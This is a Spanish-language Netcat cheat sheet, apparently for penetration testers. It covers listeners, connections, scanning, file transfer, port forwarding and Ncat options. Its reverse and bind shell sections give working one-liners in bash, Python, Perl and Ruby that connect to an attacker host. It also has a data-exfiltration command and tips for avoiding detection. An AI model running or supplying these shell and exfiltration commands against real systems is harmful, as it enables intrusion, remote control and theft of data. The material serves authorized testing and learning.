# Netcat Cheat Sheet

## Overview

Netcat (nc) es una herramienta de redes versátil utilizada para:

- Crear reverse y bind shells.
- Escaneo y enumeración de puertos.
- Transferencia de archivos.
- Reenvío de puertos y pivoting.
- Debugging y testing de redes.
- Llevar a cabo evaluaciones de seguridad autorizadas.

Netcat proporciona:

- Conexiones TCP/UDP simples.
- Modos de escucha y conexión.
- Capacidades de transferencia de archivos.
- Funcionalidad de escaneo de puertos.
- Soporte para scripting y automatización.

```text
Usa Netcat únicamente contra sistemas que poseas o tengas autorización explícita para testear.
```

---

# 1. Starting Netcat

## Sintaxis básica

```bash
nc [options] <host> <port>
```

## Mostrar ayuda

```bash
nc -h
```

## Mostrar versión

```bash
nc -V
```

## Variantes de Netcat

- `nc` - Netcat original
- `ncat` - Netcat de Nmap (versión mejorada)
- `netcat` - Implementación alternativa

---

# 2. Listening Modes

## Escuchar en un puerto

```bash
nc -l -p <port>
```

Ejemplo:

```bash
nc -l -p 4444
```

## Escuchar y mantener escucha después de desconectar

```bash
nc -l -p <port> -k
```

Ejemplo:

```bash
nc -l -p 4444 -k
```

## Escuchar con output verbose

```bash
nc -l -p <port> -v
```

Ejemplo:

```bash
nc -l -p 4444 -v
```

## Escuchar en todas las interfaces

```bash
nc -l -p <port> 0.0.0.0
```

Ejemplo:

```bash
nc -l -p 4444 0.0.0.0
```

## Escuchar en interfaz específica

```bash
nc -l -p <port> -s <interface-ip>
```

Ejemplo:

```bash
nc -l -p 4444 -s 192.168.1.10
```

## Escuchar con UDP

```bash
nc -u -l -p <port>
```

Ejemplo:

```bash
nc -u -l -p 53
```

---

# 3. Connecting Modes

## Conectar a un puerto

```bash
nc <host> <port>
```

Ejemplo:

```bash
nc 192.168.1.10 4444
```

## Conectar con output verbose

```bash
nc -v <host> <port>
```

Ejemplo:

```bash
nc -v 192.168.1.10 4444
```

## Conectar con output muy verbose

```bash
nc -vv <host> <port>
```

Ejemplo:

```bash
nc -vv 192.168.1.10 4444
```

## Conectar con timeout

```bash
nc -w <seconds> <host> <port>
```

Ejemplo:

```bash
nc -w 5 192.168.1.10 4444
```

## Conectar usando UDP

```bash
nc -u <host> <port>
```

Ejemplo:

```bash
nc -u 192.168.1.10 53
```

## Conectar usando IPv6

```bash
nc -6 <host> <port>
```

Ejemplo:

```bash
nc -6 ::1 4444
```

---

# 4. Reverse Shells

## Reverse shell con Netcat (Linux)

**En la máquina del atacante:**

```bash
nc -l -p 4444
```

**En la máquina objetivo:**

```bash
nc -e /bin/bash <attacker-ip> 4444
```

## Reverse shell con Netcat y bash

**En la máquina del atacante:**

```bash
nc -l -p 4444
```

**En la máquina objetivo:**

```bash
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
```

## Reverse shell con Netcat (Windows)

**En la máquina del atacante:**

```bash
nc -l -p 4444
```

**En la máquina objetivo:**

```bash
nc -e cmd.exe <attacker-ip> 4444
```

## Reverse shell con Netcat y named pipe

**En la máquina del atacante:**

```bash
nc -l -p 4444
```

**En la máquina objetivo:**

```bash
mkfifo f; cat f | /bin/bash -i 2>&1 | nc <attacker-ip> 4444 >f
```

## Reverse shell con Netcat y Python

**En la máquina del atacante:**

```bash
nc -l -p 4444
```

**En la máquina objetivo:**

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

## Reverse shell con Netcat y Python3

**En la máquina del atacante:**

```bash
nc -l -p 4444
```

**En la máquina objetivo:**

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

## Reverse shell con Netcat y Perl

**En la máquina del atacante:**

```bash
nc -l -p 4444
```

**En la máquina objetivo:**

```bash
perl -e 'use Socket;$i="<attacker-ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

## Reverse shell con Netcat y Ruby

**En la máquina del atacante:**

```bash
nc -l -p 4444
```

**En la máquina objetivo:**

```bash
ruby -rsocket -e'f=TCPSocket.open("<attacker-ip>",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

---

# 5. Bind Shells

## Bind shell con Netcat (Linux)

**En la máquina objetivo:**

```bash
nc -l -p 4444 -e /bin/bash
```

**En la máquina del atacante:**

```bash
nc <target-ip> 4444
```

## Bind shell con Netcat (Windows)

**En la máquina objetivo:**

```bash
nc -l -p 4444 -e cmd.exe
```

**En la máquina del atacante:**

```bash
nc <target-ip> 4444
```

## Bind shell con Netcat y bash

**En la máquina objetivo:**

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -l -p 4444 >/tmp/f
```

**En la máquina del atacante:**

```bash
nc <target-ip> 4444
```

---

# 6. File Transfers

## Transferir archivo del atacante al objetivo

**En la máquina del atacante (emisor):**

```bash
nc -l -p 4444 < file.txt
```

**En la máquina objetivo (receptor):**

```bash
nc <attacker-ip> 4444 > file.txt
```

## Transferir archivo del objetivo al atacante

**En la máquina objetivo (emisor):**

```bash
nc <attacker-ip> 4444 < file.txt
```

**En la máquina del atacante (receptor):**

```bash
nc -l -p 4444 > file.txt
```

## Transferir directorio (tar + nc)

**En el emisor:**

```bash
tar czf - directory/ | nc -l -p 4444
```

**En el receptor:**

```bash
nc <sender-ip> 4444 | tar xzf -
```

## Transferir archivo con progreso

**En el emisor:**

```bash
nc -l -p 4444 < file.txt
```

**En el receptor:**

```bash
nc -v <sender-ip> 4444 > file.txt
```

## Transferencia de múltiples archivos

**En el emisor:**

```bash
tar czf - file1.txt file2.txt file3.txt | nc -l -p 4444
```

**En el receptor:**

```bash
nc <sender-ip> 4444 | tar xzf -
```

---

# 7. Port Scanning

## Escaneo básico de puertos

```bash
nc -v -z <host> <start-port>-<end-port>
```

Ejemplo:

```bash
nc -v -z 192.168.1.10 1-1000
```

## Escanear puertos específicos

```bash
nc -v -z <host> <port1> <port2> <port3>
```

Ejemplo:

```bash
nc -v -z 192.168.1.10 21 22 80 443
```

## Escanear con timeout

```bash
nc -v -z -w <seconds> <host> <start-port>-<end-port>
```

Ejemplo:

```bash
nc -v -z -w 2 192.168.1.10 1-1000
```

## Escaneo de puertos UDP

```bash
nc -u -v -z <host> <start-port>-<end-port>
```

Ejemplo:

```bash
nc -u -v -z 192.168.1.10 1-1000
```

## Escanear y guardar output

```bash
nc -v -z <host> <start-port>-<end-port> > scan_results.txt
```

Ejemplo:

```bash
nc -v -z 192.168.1.10 1-1000 > scan_results.txt
```

## Detección rápida de servicios

```bash
nc -v <host> <port>
```

Ejemplo:

```bash
nc -v 192.168.1.10 80
```

Luego escribe:

```bash
GET / HTTP/1.0
```

---

# 8. Port Forwarding

## Reenvío local de puertos

**En el host intermedio:**

```bash
nc -l -p 8080 | nc <destination-host> 80 | nc -l -p 8080
```

## Reenvío remoto de puertos

**En la máquina del atacante:**

```bash
nc -l -p 8080 | nc <target-host> 80
```

## Reenvío de puertos en cadena

**En el primer salto:**

```bash
nc -l -p 8080 | nc <second-hop> 9090
```

**En el segundo salto:**

```bash
nc -l -p 9090 | nc <final-host> 80
```

## Reenvío de puertos con ncat

**En el host intermedio:**

```bash
ncat -l -p 8080 -c "ncat <destination-host> 80"
```

## Reenvío bidireccional

**En el host intermedio:**

```bash
mkfifo f1 f2; nc -l -p 8080 0<f1 | nc <destination-host> 80 1>f1 & nc -l -p 8080 0<f2 | nc <destination-host> 80 1>f2
```

---

# 9. Advanced Options

## Ejecutar comando al conectar

```bash
nc -l -p 4444 -e /bin/bash
```

Ejemplo:

```bash
nc -l -p 4444 -e /bin/bash
```

## Ejecutar comando después de conectar

```bash
nc -l -p 4444 -c "command"
```

Ejemplo:

```bash
nc -l -p 4444 -c "whoami"
```

## Usar puerto de origen

```bash
nc -p <source-port> <host> <port>
```

Ejemplo:

```bash
nc -p 12345 192.168.1.10 4444
```

## Usar IP de origen específica

```bash
nc -s <source-ip> <host> <port>
```

Ejemplo:

```bash
nc -s 192.168.1.10 192.168.1.20 4444
```

## Habilitar debugging

```bash
nc -d <host> <port>
```

## Usar proxy

```bash
nc -x <proxy-host>:<proxy-port> <host> <port>
```

Ejemplo:

```bash
nc -x 127.0.0.1:8080 192.168.1.10 4444
```

## Proxy con autenticación

```bash
nc -x <proxy-host>:<proxy-port> -X <auth-type> <host> <port>
```

Ejemplo:

```bash
nc -x 127.0.0.1:8080 -X 2 192.168.1.10 4444
```

---

# 10. Ncat Enhancements

## Ncat con SSL

**Listener:**

```bash
ncat -l -p 4444 --ssl
```

**Client:**

```bash
ncat <host> 4444 --ssl
```

## Ncat con autenticación

**Listener:**

```bash
ncat -l -p 4444 --allow <ip>
```

Ejemplo:

```bash
ncat -l -p 4444 --allow 192.168.1.10
```

## Ncat con múltiples allows

```bash
ncat -l -p 4444 --allow 192.168.1.10 --allow 192.168.1.20
```

## Ncat con deny

```bash
ncat -l -p 4444 --deny <ip>
```

Ejemplo:

```bash
ncat -l -p 4444 --deny 192.168.1.100
```

## Ncat con proxy HTTP

```bash
ncat --proxy <proxy-host>:<proxy-port> <host> <port>
```

Ejemplo:

```bash
ncat --proxy 127.0.0.1:8080 192.168.1.10 4444
```

## Ncat con proxy SOCKS

```bash
ncat --proxy-type socks4 --proxy <proxy-host>:<proxy-port> <host> <port>
```

Ejemplo:

```bash
ncat --proxy-type socks4 --proxy 127.0.0.1:9050 192.168.1.10 4444
```

## Ncat con chat

**Listener:**

```bash
ncat -l -p 4444 --chat
```

**Client:**

```bash
ncat <host> 4444 --chat
```

---

# 11. Common Attack Scenarios

## Listener para reverse shell

```bash
nc -l -p 4444
```

## Configuración de bind shell

```bash
nc -l -p 4444 -e /bin/bash
```

## Receptor de archivos

```bash
nc -l -p 4444 > received_file.txt
```

## Emisor de archivos

```bash
nc <target-ip> 4444 < file_to_send.txt
```

## Escaneo de puertos

```bash
nc -v -z 192.168.1.10 1-1000
```

## Probe de servicios

```bash
nc -v 192.168.1.10 80
```

## Banner grabbing

```bash
nc 192.168.1.10 21
```

## Petición HTTP

```bash
nc 192.168.1.10 80
GET / HTTP/1.0
```

## Servidor de chat simple

```bash
nc -l -p 4444
```

## Exfiltración de datos

```bash
nc <attacker-ip> 4444 < sensitive_data.txt
```

---

# 12. Practical Workflows

## Flujo de trabajo básico de reverse shell

```text
1. Iniciar listener de netcat en el atacante.
2. Ejecutar reverse shell en el objetivo.
3. Interactuar con la shell.
4. Realizar post-explotación.
5. Documentar hallazgos.
```

## Ejemplo: Reverse shell Linux

```bash
# Atacante
nc -l -p 4444

# Objetivo
nc -e /bin/bash <attacker-ip> 4444
```

## Ejemplo: Reverse shell Windows

```bash
# Atacante
nc -l -p 4444

# Objetivo
nc -e cmd.exe <attacker-ip> 4444
```

## Ejemplo: Transferencia de archivos

```bash
# Receptor
nc -l -p 4444 > file.txt

# Emisor
nc <receiver-ip> 4444 < file.txt
```

## Ejemplo: Escaneo de puertos

```bash
# Escaneo rápido
nc -v -z 192.168.1.10 21,22,80,443

# Escaneo completo
nc -v -z -w 2 192.168.1.10 1-1000
```

## Ejemplo: Banner grabbing

```bash
# Banner FTP
nc 192.168.1.10 21

# Banner HTTP
nc 192.168.1.10 80
GET / HTTP/1.0

# Banner SSH
nc 192.168.1.10 22
```

## Ejemplo: Reenvío de puertos

```bash
# Reenvío simple
nc -l -p 8080 | nc <destination> 80

# Con ncat
ncat -l -p 8080 -c "ncat <destination> 80"
```

---

# 13. Common Commands Reference

| Command | Description |
|---|---|
| `nc -h` | Mostrar ayuda |
| `nc -V` | Mostrar versión |
| `nc -l -p <port>` | Escuchar en puerto |
| `nc -l -p <port> -k` | Escuchar y mantener escucha |
| `nc -l -p <port> -e <cmd>` | Ejecutar comando al conectar |
| `nc <host> <port>` | Conectar a host:port |
| `nc -v <host> <port>` | Conectar con output verbose |
| `nc -v -z <host> <port>` | Escanear puerto |
| `nc -u <host> <port>` | Usar UDP |
| `nc -w <seconds> <host> <port>` | Establecer timeout |
| `nc -s <ip> <host> <port>` | Usar IP de origen |
| `nc -p <port> <host> <port>` | Usar puerto de origen |
| `nc -e <cmd> <host> <port>` | Ejecutar comando |
| `nc -x <proxy> <host> <port>` | Usar proxy |
| `ncat --ssl <host> <port>` | Usar SSL |
| `ncat --chat <host> <port>` | Modo chat |
| `ncat --allow <ip>` | Permitir IP específica |
| `ncat --deny <ip>` | Denegar IP específica |

---

# 14. Troubleshooting

## Connection refused

- Comprueba si el listener está en ejecución.
- Verifica que el puerto no esté bloqueado por el firewall.
- Asegúrate de que la dirección IP es correcta.
- Comprueba si el servicio está escuchando.

## Timeout de conexión

- Aumenta el timeout con `-w`.
- Comprueba la conectividad de red.
- Verifica que el objetivo es alcanzable.
- Comprueba las reglas del firewall.

## No se reciben datos

- Verifica la sintaxis del comando.
- Comprueba si el comando se ejecutó correctamente.
- Asegúrate de tener los permisos apropiados.
- Verifica la ruta de red.

## Permission denied

- Ejecuta con privilegios apropiados.
- Comprueba si el puerto requiere root (>1024).
- Verifica las políticas de SELinux/AppArmor.
- Usa puertos no privilegiados.

## Transferencia lenta

- Comprueba el ancho de banda de red.
- Verifica la congestión de red.
- Usa compresión si está disponible.
- Comprueba si hay pérdida de paquetes.

---

# 15. Security Best Practices

## Verifica siempre las conexiones

- Confirma que te estás conectando al host correcto.
- Verifica los números de puerto.
- Comprueba si hay ataques man-in-the-middle.
- Usa encriptación cuando sea posible.

## Minimiza la detección

- Usa puertos no estándar.
- Evita escaneos ruidosos.
- Usa timing apropiado.
- Limpia después de testear.

## Usa encriptación

- Usa ncat con SSL cuando esté disponible.
- Considera túneles SSH para datos sensibles.
- Evita enviar credenciales en texto claro.
- Usa VPN para seguridad adicional.

## Documenta todo

- Registra todos los comandos usados.
- Nota los detalles de conexión.
- Rastrea las transferencias de datos.
- Documenta hallazgos y métodos.

## Limpia después de testear

- Mata los procesos listener.
- Elimina archivos temporales.
- Cierra todas las conexiones.
- Verifica que no queden backdoors.

---

# 16. Important Reminders

- Obtén siempre autorización explícita antes de usar Netcat.
- Testea primero en un entorno de laboratorio controlado.
- Algunos usos pueden triggerar alertas de seguridad.
- Respeta los límites y políticas de red.
- Mantén Netcat actualizado regularmente.
- Valida los hallazgos manualmente.
- Documenta todas las acciones y comandos.
- Preserva la evidencia original y los logs.
- Entiende las implicaciones legales y éticas.
- Limpia después de testear.

---

# 17. Quick Reference Examples

## Iniciar listener

```bash
nc -l -p 4444
```

## Conectar al listener

```bash
nc 192.168.1.10 4444
```

## Reverse shell

```bash
nc -e /bin/bash 192.168.1.10 4444
```

## Bind shell

```bash
nc -l -p 4444 -e /bin/bash
```

## Transferencia de archivos

```bash
nc -l -p 4444 > file.txt
```

## Escaneo de puertos

```bash
nc -v -z 192.168.1.10 1-1000
```

## Banner grabbing

```bash
nc 192.168.1.10 80
```

## Conexión UDP

```bash
nc -u 192.168.1.10 53
```

## Con timeout

```bash
nc -w 5 192.168.1.10 4444
```

## Escaneo verbose

```bash
nc -vv -z 192.168.1.10 1-1000
```

## Ncat con SSL

```bash
ncat --ssl 192.168.1.10 4444
```

---

# 18. Additional Resources

## Netcat Official

```text
http://netcat.sourceforge.net/
```

## Ncat (Nmap)

```text
https://nmap.org/ncat/
```

## Netcat Cheatsheet

```text
https://github.com/udayvir/netcat-cheatsheet
```

## TCP/IP Networking

```text
https://www.tcpipguide.com/
```

## Network Security

```text
https://www.sans.org/
```
